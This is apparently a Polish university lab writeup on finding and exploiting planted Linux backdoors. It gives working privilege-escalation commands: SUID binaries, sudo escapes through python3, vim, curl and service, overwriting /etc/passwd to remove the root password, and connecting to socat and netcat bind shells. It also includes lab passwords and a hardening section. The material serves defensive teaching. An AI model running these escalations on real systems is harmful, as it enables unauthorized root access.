# 🔐 Wykrywanie Tylnych Furtek — Lab Writeup
### Zajęcia nr 7 | Polsko-Japońska Akademia Technik Komputerowych


---

## 📋 Spis treści

- [O projekcie](#-o-projekcie)
- [Środowisko laboratoryjne](#-środowisko-laboratoryjne)
- [Omówione podatności](#-omówione-podatności)
- [Writeup — zadania podstawowe](#-writeup--zadania-podstawowe)
- [Writeup — zadania pentest](#-writeup--zadania-pentest)
- [Jak się przed tym bronić?](#-jak-się-przed-tym-bronić)
- [Czego się nauczyłem](#-czego-się-nauczyłem)
- [Narzędzia](#-narzędzia)

---

## 🎯 O projekcie

To są notatki i writeup z laboratorium bezpieczeństwa przeprowadzonego w środowisku wirtualnym. Celem było **znalezienie i wykorzystanie tylnych furtek** zainstalowanych przez „atakującego" na różnych systemach Linux, a następnie eskalacja uprawnień do roota.

**Zakres ćwiczeń:**
- Wykrywanie plików z bitem SUID
- Analiza uprawnień sudo
- Modyfikacje pliku `/etc/passwd`
- Bind shell jako backdoor
- Automatyczna analiza z linPEAS
- Skanowanie portów z nmap

---

## 🖥️ Środowisko laboratoryjne

```
Maszyna studenta (Kali Linux)
        |
        | OpenVPN (192.168.100.x)
        |
Backdoor Detection (192.168.100.7)
  ├── SYSTEM 0-9 (kontenery z backdoorami, porty 2200-2209)
  └── student@192.168.100.7 (główna maszyna ćwiczeniowa)
        |
        | sieć wewnętrzna (192.168.200.x)
        |
Backdoor Detection PENTEST (192.168.200.57)
  └── cel pentestu
```

Połączenie z systemami przez SSH:
```bash
ssh student@192.168.100.7           # maszyna ćwiczeniowa
ssh system0@192.168.100.7 -p 2200   # system 0 (baseline)
ssh system1@192.168.100.7 -p 2201   # system 1 (SUID backdoor)
# itd.
```

---

## 🕵️ Omówione podatności

| # | Typ backdoora | Metoda wykrycia | Metoda eksploitacji |
|---|--------------|-----------------|---------------------|
| 0 | Brak (baseline) | — | `su` z hasłem |
| 1 | SUID binary (widoczny) | `ls -l` | uruchomienie pliku |
| 2 | SUID binary (ukryty) | `find / -perm /6000` | uruchomienie pliku |
| 3 | Bash z bitem SUID | `find / -perm /6000` | `bash -p` |
| 4 | Podmieniony SUID binary | SHA1 checksum | uruchomienie pliku |
| 5 | Sudo misconfiguration | `sudo -l` | `sudo python3 -c "..."` |
| 6 | Sudo + GTFOBins | `sudo -l` | `sudo vim` → `:!bash` |
| 7 | Modyfikacja `/etc/passwd` | `cat /etc/passwd` | `su` bez hasła |
| 8 | Curl + passwd overwrite | `sudo -l` | curl z `file://` |
| 9 | Bind shell (socat) | `ss -tlpn` / `ps aux` | `socat` connect |

---

## 📝 Writeup — zadania podstawowe

### Zadanie 7.1 & 7.2 — Przygotowanie: upload linPEAS

**Cel:** Wgrać narzędzie linPEAS na maszynę ćwiczeniową i je uruchomić.

```bash
# Na Kali Linux — pobieramy linPEAS
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh

# Przesyłamy na maszynę ćwiczeniową
scp linpeas.sh student@192.168.100.7:/home/student

# Na maszynie ćwiczeniowej — uruchamiamy
bash linpeas.sh
```

**Czego się nauczyłam:** linPEAS to skrypt shellowy, który automatycznie szuka słabych punktów w systemie. Generuje dużo wyników — w tym fałszywe alarmy (false positives). Dlatego nie można ślepo ufać automatycznym narzędziom — wyniki trzeba analizować manualnie.

---

### Zadanie 7.3 — Backdoor 0: Baseline (czysty system)

**Cel:** Zobaczyć jak wygląda czysty system bez backdoorów, żeby mieć punkt odniesienia.

```bash
ssh system0@192.168.100.7 -p 2200  # hasło: pjatk
su                                  # hasło: toor
/root/solve
```

**Czego się nauczyłam:** "System zero" to referencja. Porównując go z innymi systemami można łatwiej wykryć zmiany (nowe pliki, zmienione hashe, inne wpisy w sudoers).

---

### Zadanie 7.4 — Backdoor 1: SUID (widoczny)

**Opis:** Atakujący zostawił w katalogu domowym plik binarny z ustawionym bitem SUID należący do roota. Uruchomienie go daje powłokę z uprawnieniami roota.

**Wykrycie:**
```bash
ls -l
# -rwsr-xr-x 1 root root 14480 Jul 18 10:46 backdoor
#  ^^^ "s" zamiast "x" = bit SUID
```

**Eksploitacja:**
```bash
./backdoor
/root/solve
```

**Co to jest SUID?** Bit SUID (Set User ID) na pliku wykonywalnym sprawia, że program uruchamia się z uprawnieniami właściciela pliku (nie osoby, która go uruchamia). Jeśli właścicielem jest root — każdy może uzyskać uprawnienia roota.

---

### Zadanie 7.5 — Backdoor 2: Ukryty SUID

**Opis:** Tym razem plik z SUID jest ukryty gdzieś w systemie — nie w oczywistym miejscu.

**Wykrycie:**
```bash
find / -type f -perm /6000 2>/dev/null
# /usr/sbin/nothing  <-- podejrzane! nie ma tu nic z domyślnej instalacji
```

**Eksploitacja:**
```bash
/usr/sbin/nothing
/root/solve
```

**Czego się nauczyłam:** Polecenie `find / -perm /6000` szuka plików z bitem SUID **lub** SGID w całym systemie. Wyniki trzeba porównać z domyślną instalacją systemu — wszystko co „odstaje" jest podejrzane.

---

### Zadanie 7.6 — Backdoor 3: Bash z SUID

**Opis:** W systemie jest bash z ustawionym bitem SUID. Ale jest haczyk — bash domyślnie **ignoruje SUID** ze względów bezpieczeństwa!

**Wykrycie:**
```bash
find / -type f -perm /6000 2>/dev/null
# /usr/bin/bash  <-- bash ma SUID!
```

**Eksploitacja:**
```bash
bash -p     # flaga -p = "privileged" = NIE porzucaj SUID uprawnień
id          # uid=1000(system3) gid=1000(system3) euid=0(root)
/root/solve
```

**Uwaga:** Bez flagi `-p` bash automatycznie cofa podwyższone uprawnienia. To ważna różnica między zwykłym binarnym backdoorem a shellem jako backdoorem.

---

### Zadanie 7.7 — Backdoor 4: Podmieniony SUID binary

**Opis:** Jeden z systemowych plików z SUID został podmieniony na backdoora. Na liście plików wygląda normalnie — wykrycie wymaga porównania hashy.

**Wykrycie:**
```bash
# Na system4:
find / -type f -perm /6000 -exec sha1sum {} \; 2>/dev/null

# Na system0 (baseline):
find / -type f -perm /6000 -exec sha1sum {} \; 2>/dev/null

# Porównanie wyników — różny hash dla /usr/lib/openssh/ssh-keysign
# to podejrzany plik!
```

**Eksploitacja:**
```bash
/usr/lib/openssh/ssh-keysign
/root/solve
```

**Czego się nauczyłam:** Sama lista plików z SUID może wyglądać normalnie. Prawdziwa weryfikacja to porównanie hash sumy z czystą instalacją. W środowiskach produkcyjnych do tego służą narzędzia takie jak `AIDE`, `Tripwire` lub `auditd`.

---

### Zadanie 7.8 — Backdoor 5: Sudo misconfiguration

**Opis:** Użytkownik ma prawo uruchamiać `python3` przez sudo — bez żadnych ograniczeń co do argumentów.

**Wykrycie:**
```bash
sudo -l
# User system5 may run the following commands:
#     (root) /usr/bin/python3
```

**Eksploitacja:**
```bash
sudo /usr/bin/python3 -c "import os;os.system('/root/solve')"
```

**Dlaczego to działa?** Python3 z sudo uruchamia się jako root. Moduł `os.system()` pozwala wykonać dowolną komendę systemową — więc wykonujemy `/root/solve` z uprawnieniami roota.

---

### Zadanie 7.9 — Backdoor 6: GTFOBins (vim)

**Opis:** Użytkownik może uruchamiać `vim` przez sudo. Vim ma wbudowaną możliwość wykonywania poleceń systemowych.

**Wykrycie:**
```bash
sudo -l
# (root) /usr/bin/vim
```

**Eksploitacja:**
```bash
sudo vim       # otwieramy vim jako root
:!bash         # w trybie komend wpisujemy :!bash
/root/solve    # teraz jesteśmy rootem
```

**Co to GTFOBins?** Strona [gtfobins.github.io](https://gtfobins.github.io) to baza danych narzędzi Linuksowych, które można nadużyć do eskalacji uprawnień. Jeśli jakiś program ma sudo — warto tam sprawdzić czy da się go wykorzystać.

---

### Zadanie 7.10 — Backdoor 7: Modyfikacja /etc/passwd

**Opis:** Plik `/etc/passwd` został zmodyfikowany — root nie ma hasła.

**Wykrycie:**
```bash
cat /etc/passwd | grep root
# root::0:0:root:/root:/bin/bash
#      ^^ puste pole hasła = brak hasła!
```

Normalnie wygląda to tak:
```
root:x:0:0:root:/root:/bin/bash
     ^ "x" oznacza że hasło jest w /etc/shadow
```

**Eksploitacja:**
```bash
su          # po prostu wciskamy Enter bez hasła
/root/solve
```

---

### Zadanie 7.11 — Backdoor 8: All in One (curl + passwd overwrite)

**Opis:** Użytkownik może uruchamiać `curl` przez sudo. curl pozwala pobierać pliki — i zapisywać je w dowolne miejsce, w tym nadpisać `/etc/passwd`.

**Wykrycie:**
```bash
sudo -l
# (root) /usr/bin/curl
```

**Eksploitacja:**
```bash
# 1. Kopiujemy /etc/passwd do katalogu domowego
cp /etc/passwd .

# 2. Usuwamy hash hasła roota (zamieniamy "x" na nic)
sed -i s/root:x/root:/ ./passwd

# 3. Nadpisujemy /etc/passwd naszą wersją przez curl z sudo
sudo curl file:///home/system8/passwd -o /etc/passwd

# 4. Logujemy się jako root bez hasła
su
/root/solve
```

**Czego się nauczyłam:** `file://` to protokół URL do lokalnych plików. curl z sudo może pobierać i zapisywać pliki z uprawnieniami roota — to bardzo niebezpieczna konfiguracja.

---

### Zadanie 7.12 — Backdoor 9: Bind Shell

**Opis:** Na systemie działa `socat` nasłuchujący na porcie 12345, który udostępnia powłokę bash. To klasyczny bind shell.

**Wykrycie:**
```bash
ss -tlpn
# LISTEN  127.0.0.1:12345  <-- podejrzany port!

ps aux
# root  1  socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/bash,...
```

**Eksploitacja:**
```bash
socat FILE:`tty`,raw,echo=0 TCP:127.0.0.1:12345
/root/solve
```

**Czego się nauczyłam:** Bind shell to proces nasłuchujący na porcie i dający dostęp do powłoki każdemu kto się połączy. `ss -tlpn` i `ps aux` to podstawowe narzędzia do wykrywania takich procesów.

---

## 🔴 Writeup — zadania pentest

### Zadanie 7.1p–7.2p — Rekonesans z nmap

**Cel:** Skan portów na maszynie pentest (192.168.200.57) z maszyny ćwiczeniowej (nie bezpośrednio z Kali, bo maszyna pentest jest w sieci wewnętrznej).

```bash
# Upload nmap (statyczna binarka — nie wymaga instalacji)
wget https://github.com/opsec-infosec/nmap-static-binaries/releases/download/v2/nmap-x64.tar.gz
scp nmap-x64.tar.gz student@192.168.100.7:/home/student

# Na maszynie ćwiczeniowej
tar zxvf nmap-x64.tar.gz
./nmap -p- -n -Pn -sV -vv 192.168.200.57
```

**Wyniki skanu:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy?   <-- podejrzane! brak wersji, oznakowane "?"
5355/tcp open  llmnr
```

Port 8080 bez wykrytej wersji i z "?" to sygnał ostrzegawczy — nmap nie rozpoznał usługi, bo to nie jest HTTP.

---

### Zadanie 7.3p — Bind Shell na porcie 8080

```bash
# Na maszynie ćwiczeniowej
nc 192.168.200.57 8080

# Dostajemy powłokę jako admin!
id
# uid=1001(admin) gid=1001(admin) groups=1001(admin),27(sudo)
```

---

### Zadanie 7.4p–7.5p — Upload i uruchomienie linPEAS

Maszyna pentest nie ma dostępu do internetu ani do sieci VPN. Żeby wgrać linPEAS, stawiamy serwer HTTP na maszynie ćwiczeniowej:

```bash
# Terminal 1 — serwer HTTP na maszynie ćwiczeniowej
python3 -m http.server 1234

# Terminal 2 — bind shell do maszyny pentest
nc 192.168.200.57 8080
wget http://192.168.200.7:1234/linpeas.sh
bash linpeas.sh
```

linPEAS wykrył: **`sudo service` bez hasła (NOPASSWD)**

---

### Zadanie 7.6p — Flaga Roota przez sudo + GTFOBins

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/sbin/service

# GTFOBins: https://gtfobins.github.io/gtfobins/service/#sudo
sudo service ../../bin/bash
id
# uid=0(root)

cat /root/root.txt
# PJATK{FLAG}
```

---

## 🛡️ Jak się przed tym bronić?

### 1. Nadmiarowe pliki z SUID

**Problem:** Nieautoryzowane pliki z bitem SUID dają dowolnemu użytkownikowi uprawnienia roota.

**Zabezpieczenie:**
```bash
# Znajdź wszystkie pliki z SUID i porównaj z baseline
find / -type f -perm /6000 -exec sha1sum {} \; 2>/dev/null > suid_current.txt

# Włącz audyt zmian plików z SUID
auditctl -w /usr/bin -p wa -k suid_watch

# Regularnie monitoruj z narzędziami jak AIDE lub Tripwire
aide --check
```

**Zasada:** Lista plików z SUID powinna być znana, udokumentowana i monitorowana. Każda zmiana = alarm.

---

### 2. Misconfiguracja sudo

**Problem:** `sudo -l` pokazuje zbyt szerokie uprawnienia (np. cały python3, vim, curl).

**Zabezpieczenie:**
```bash
# Zamiast dawać dostęp do całego programu:
# ŹLE:
system5 ALL=(root) /usr/bin/python3

# Ogranicz do konkretnej komendy (i zablokuj argumenty):
# LEPIEJ (choć i tak ryzykowne):
system5 ALL=(root) /usr/bin/python3 /opt/scripts/backup.py

# Włącz logowanie wszystkich wywołań sudo:
# /etc/sudoers
Defaults logfile="/var/log/sudo.log"
Defaults log_input, log_output
```

**Zasada:** Zasada najmniejszych uprawnień (Principle of Least Privilege). Użytkownik powinien mieć dostęp tylko do tego, czego faktycznie potrzebuje.

---

### 3. Modyfikacja /etc/passwd

**Problem:** Jeśli ktoś ma dostęp do zapisu `/etc/passwd`, może usunąć hasło roota.

**Zabezpieczenie:**
```bash
# Upewnij się, że /etc/passwd ma właściwe uprawnienia
chmod 644 /etc/passwd
chown root:root /etc/passwd

# Włącz monitorowanie zmian w plikach konfiguracyjnych
auditctl -w /etc/passwd -p wa -k passwd_changes
auditctl -w /etc/shadow -p wa -k shadow_changes

# Użyj immutable flag (opcjonalnie, dla ekstra ochrony)
chattr +i /etc/passwd
```

---

### 4. Bind Shell / Ukryte serwisy

**Problem:** Złośliwy proces nasłuchuje na porcie i daje powłokę każdemu kto się połączy.

**Zabezpieczenie:**
```bash
# Regularnie sprawdzaj nasłuchujące porty
ss -tlpn
netstat -tlpn

# Skonfiguruj firewall — blokuj wszystko co nie jest potrzebne
ufw default deny incoming
ufw allow 22/tcp  # tylko SSH
ufw enable

# Monitoruj procesy
ps aux | grep -E "(socat|nc|ncat|bash -i)"

# Użyj IDS/IPS jak Suricata lub Snort
```

---

### 5. Ogólne zasady hardeningu

```bash
# Wyłącz niepotrzebne usługi
systemctl disable <usługa>
systemctl stop <usługa>

# Regularnie aktualizuj system
apt update && apt upgrade -y

# Ustaw silną politykę haseł
# /etc/security/pwquality.conf
minlen = 12
dcredit = -1
ucredit = -1
ocredit = -1
lcredit = -1

# Włącz fail2ban przeciwko brute-force na SSH
apt install fail2ban
systemctl enable fail2ban

# Ogranicz dostęp SSH
# /etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no  # tylko klucze SSH
AllowUsers twój_użytkownik
```

---

## 💡 Czego się nauczyłem

1. **Automatyczne narzędzia nie są idealne** — linPEAS generuje false positives. Wyniki zawsze trzeba weryfikować manualnie i w kontekście.

2. **Porównywanie z baseline jest kluczowe** — wykrycie podmienionego binarnego pliku systemowego było możliwe tylko przez porównanie hash sumy z czystą instalacją.

3. **Zasada najmniejszych uprawnień działa** — większość backdoorów była możliwa do wykorzystania tylko dlatego, że ktoś dał za szerokie uprawnienia (sudo, SUID).

4. **GTFOBins to must-have** — wiele narzędzi systemowych (vim, curl, python) można użyć do eskalacji uprawnień jeśli mają sudo.

5. **Monitoring sieci to podstawa** — bind shell był widoczny przez `ss -tlpn` i `ps aux`. Regularne sprawdzanie nasłuchujących portów to tanie, efektywne zabezpieczenie.

6. **Zawsze sprawdzaj `/etc/passwd`** — brak znaku `x` w polu hasła to natychmiastowy alarm.

---

## 🛠️ Narzędzia

| Narzędzie | Zastosowanie | Link |
|-----------|-------------|------|
| **linPEAS** | Automatyczne wykrywanie słabych punktów | [GitHub](https://github.com/peass-ng/PEASS-ng) |
| **nmap** | Skanowanie portów i usług | [nmap.org](https://nmap.org) |
| **GTFOBins** | Baza danych exploitów dla narzędzi systemowych | [gtfobins.github.io](https://gtfobins.github.io) |
| **socat** | Tworzenie i wykrywanie bind/reverse shell | `man socat` |
| **find** | Wyszukiwanie plików z SUID/SGID | `man find` |
| **ss / netstat** | Lista nasłuchujących portów | `man ss` |
| **AIDE** | File integrity monitoring | [aide.github.io](https://aide.github.io) |
| **auditd** | Audit zdarzeń systemowych | `man auditctl` |

---

## 📚 Dodatkowe materiały

- [OWASP — Privilege Escalation](https://owasp.org/www-community/vulnerabilities/Privilege_Escalation)
- [HackTricks — Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [GTFOBins](https://gtfobins.github.io)
- [Linux Hardening Guide](https://madaidans-insecurities.github.io/guides/linux-hardening.html)

---

<div align="center">

**Wykonane w ramach kursu cyberbezpieczeństwa**  
Polsko-Japońska Akademia Technik Komputerowych  
`pd5206` · Styczeń 2026

</div>
